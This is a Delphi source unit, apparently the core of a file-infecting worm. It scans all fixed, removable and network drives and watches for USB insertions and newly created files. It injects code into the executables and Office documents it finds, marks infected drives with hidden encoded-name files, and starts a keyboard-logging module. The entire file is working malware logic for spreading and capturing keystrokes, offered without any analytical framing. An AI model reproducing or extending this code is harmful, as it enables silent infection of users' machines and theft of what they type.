unit FI;

interface

uses
  Windows, Classes, SysUtils, DateUtils, uFnc, uTypes, uUsb, uDir, FIE, FIO, FIK, uWin, uEnc;

type
  TFI = class(TComponent)
  private
    ConfigData: TCnfg;
    USB: TUsNo;
    DIR: TShellNotify;
    FIE: TFIE;
    FIK: TFIK;
    procedure FID(DrivePath: string);
    procedure FSysI;
    procedure InFi(Path: string; Files: TStringList = nil);
    procedure onUEvent(const bInserted: boolean; const sDrive: string);
    procedure onDEvent(Sender: TObject; Event: TShellNotifyEvent; Path1, Path2: string);
  public
    constructor Create(AOwner: TComponent; Config: TCnfg);
    procedure Run();
    procedure Stop();
  end;

  procedure Register;

implementation

procedure Register;
begin
  Classes.RegisterComponents('IJC', [TFI]);
end;

constructor TFI.Create(AOwner: TComponent; Config: TCnfg);
begin
  inherited Create(AOwner);
  ConfigData := Config;
end; { Constructor -> Set Default Variable }

procedure TFI.Run();
begin
  // Run System Scan
  FSysI;

  // Create USB Hooks
  USB := TUsNo.Create;
  USB.OnDvVo := onUEvent;

  // Create Directory Hooks
  DIR := TShellNotify.Create(Self);
  DIR.OnNotify := onDEvent;
  DIR.PathList.Add(GtSpFo(5));
  DIR.PathList.Add(GtSpFo(6));
  DIR.PathList.Add(GtSpFo(7));
  DIR.Active := True;

  // Create Keyboard Log
  FIK := TFIK.Create(Owner, ConfigData);
  FIK.Run(True);
end; { Run -> Tüm Modülleri Baþlatýr }

procedure TFI.Stop();
begin
  USB.Destroy;
  DIR.Close;
  DIR.Destroy;
  FIK.Run(False);
end; { Stop -> Tüm Modülleri Durdurur }

{****************************************************************************
                     USB & Directory Events
****************************************************************************}

procedure TFI.onUEvent(const bInserted: boolean; const sDrive: string);
begin
  if bInserted then
  begin
    // Set Directory Watcher
    DIR.Active := False;
    DIR.PathList.Add(sDrive);
    DIR.Active := True;

    // Run First Injection
    FID(sDrive);
  end else
  begin
    // Remove Directory Watcher
    if DIR.PathList.IndexOf(sDrive) <> -1 then begin
      DIR.Active := False;
      DIR.PathList.Delete(DIR.PathList.IndexOf(sDrive));
      DIR.Active := True;
    end;
  end;
end; { onUsbEvent -> Flashdisk Event }

procedure TFI.onDEvent(Sender: TObject; Event: TShellNotifyEvent; Path1, Path2: string);
begin
  case Event of
    neCreate: InFi(Path1);
  end;
end; { onDirEvent -> Dizin Event }

{****************************************************************************
                     Injection Functions
****************************************************************************}

procedure TFI.FID(DrivePath: string);
var
  logFile: string;
begin
  logFile := IncludeTrailingPathDelimiter(DrivePath) + DE('WVDHHpozZZ+kqsMz');

  if (not FileExists(logFile)) or (CompareDate(IncDay(FileDateToDateTime(FileAge(logFile)), 2), Now) < 0) then begin
    // Scan & Inject Process
    InFi('', ScPa(DrivePath));

    // Create Log File
    CloseHandle(FileCreate(logFile));
    FileSetAttr(logFile, FILE_ATTRIBUTE_HIDDEN);
  end;
end;

procedure TFI.FSysI;
var
  cH: Char;
  Drive: string;
  logFile: string;
  Dt: TDateTime;
  Files: TStringList;
begin
  // Find Files
  Drive := '-:\';
  for cH := 'A' to 'Z' do begin
    Drive[1] := ch;
    case GDT(PChar(Drive)) of
      DRIVE_REMOVABLE, DRIVE_FIXED, DRIVE_REMOTE:
        begin
          // Create Log File
          logFile := Drive + DE('WVDHHpozZZ+kqsMz');
          if (not FileExists(logFile)) or (CompareDate(IncMonth(FileDateToDateTime(FileAge(logFile)), 2), Now) < 0) then begin
            // Scan System Drive
            if ExtractFileDrive(GtSm32D) = ExtractFileDrive(Drive) then begin
              Files := TStringList.Create;
              Files.AddStrings(ScPa(GtSpFo(5)));
              Files.AddStrings(ScPa(GtSpFo(6)));
              if ConfigData.SO <> 'XP' then
                Files.AddStrings(ScPa(GtSpFo(7)));
              InFi('', Files);
            end else begin
              if IsDirectoryWritable(Drive) then
                InFi('', ScPa(Drive));
            end;

            // Create Log File
            if FileExists(logFile) then begin
              FileSetAttr(logFile, 128);
              DeleteFile(logFile);
            end;
            CloseHandle(FileCreate(logFile));
            FileSetAttr(logFile, 6);
          end;
        end;
    end;
  end;
end;

procedure TFI.InFi(Path: string; Files: TStringList = nil);
var
  IOF: TFIO;
begin
  // Create Exe Instance
  if not Assigned(FIE) then FIE := TFIE.Create(Self, ConfigData);

  try
    // Create Office Instance
    IOF := TFIO.Create(Self, ConfigData);

    // Process Files
    if Files <> nil then begin
      FIE.InFis(Files);
      IOF.InFis(Files);
    end else begin
      FIE.InFi(Path);
      IOF.InFi(Path);
    end;
  finally
    IOF.Free;
  end
end;

end.

